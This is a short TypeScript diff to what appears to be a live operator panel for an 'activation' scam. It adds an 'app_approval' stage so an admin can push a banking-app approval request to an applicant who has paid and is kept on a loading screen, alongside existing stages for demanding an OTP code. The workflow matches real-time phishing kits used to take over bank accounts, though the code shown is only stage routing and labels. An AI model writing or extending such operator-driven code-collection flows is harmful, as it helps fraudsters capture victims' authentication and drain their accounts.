@@ -14,16 +14,17 @@ export type ActivationStage =
   | "waiting" // paid, on the loading screen, awaiting the admin's decision
   | "otp" // admin asked for a code; applicant is on the OTP screen
   | "otp_verified" // code accepted; back to loading, awaiting final approval
+  | "app_approval" // admin sent the request to the banking app; applicant is on the approval screen
   | "approved" // admin approved; applicant sees the welcome screen
   | "rejected"; // admin declined
 
 export const OTP_LENGTH = 6;
 
 /** The stages an admin can move an applicant into from the queue. */
-export const ADMIN_STAGE_ACTIONS = ["otp", "approved", "rejected", "waiting"] as const;
+export const ADMIN_STAGE_ACTIONS = ["otp", "app_approval", "approved", "rejected", "waiting"] as const;
 
 /** Stages still awaiting an admin, i.e. what the activation queue should list. */
-export const OPEN_STAGES: ActivationStage[] = ["waiting", "otp", "otp_verified"];
+export const OPEN_STAGES: ActivationStage[] = ["waiting", "otp", "otp_verified", "app_approval"];
 
 /** The route each stage belongs on. Applicant pages redirect here to stay in sync. */
 export function activationDestination(stage: string): string {
@@ -34,6 +35,7 @@ export function activationDestination(stage: string): string {
       return "/activate/approved";
     case "waiting":
     case "otp_verified":
+    case "app_approval":
     case "rejected":
     default:
       return "/activate/pending";
@@ -44,6 +46,7 @@ const LABELS: Record<string, string> = {
   waiting: "Awaiting review",
   otp: "Code sent",
   otp_verified: "Code verified",
+  app_approval: "Approving in app",
   approved: "Approved",
   rejected: "Declined",
 };
